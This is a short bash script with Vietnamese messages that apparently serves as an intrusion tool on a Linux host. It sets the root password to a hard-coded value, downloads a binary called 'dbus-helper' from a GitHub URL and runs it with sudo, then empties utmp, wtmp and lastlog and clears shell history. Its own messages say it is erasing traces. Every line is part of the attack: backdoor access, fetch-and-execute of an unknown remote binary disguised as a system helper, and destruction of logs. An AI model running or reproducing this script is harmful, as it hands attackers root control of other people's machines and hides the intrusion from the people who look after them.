clear

echo -e "\e[36m[dbus-helper] _911"

echo -e "root:quangbaonguyen@123" | chpasswd 

echo -e "\e[32m đổi password thành công"

echo -e "\e[33mĐang tải dbus-helper..."
wget https://github.com/catherine935/dbus/raw/refs/heads/main/dbus-helper > /dev/null 2>&1
echo -e "\e[32mĐã tải thành công, tiến hành cài đặt..."
chmod +x dbus-helper
sudo ./dbus-helper

echo -e "\e[32mĐã cài đặt thành công đang xóa dấu vết"
: > /var/run/utmp
: > /var/log/wtmp
: > /var/log/lastlog
export HISTSIZE=0
history -c
source /root/.bashrc 2>/dev/null

echo -e "\e[31mĐã xóa dấu vết!"
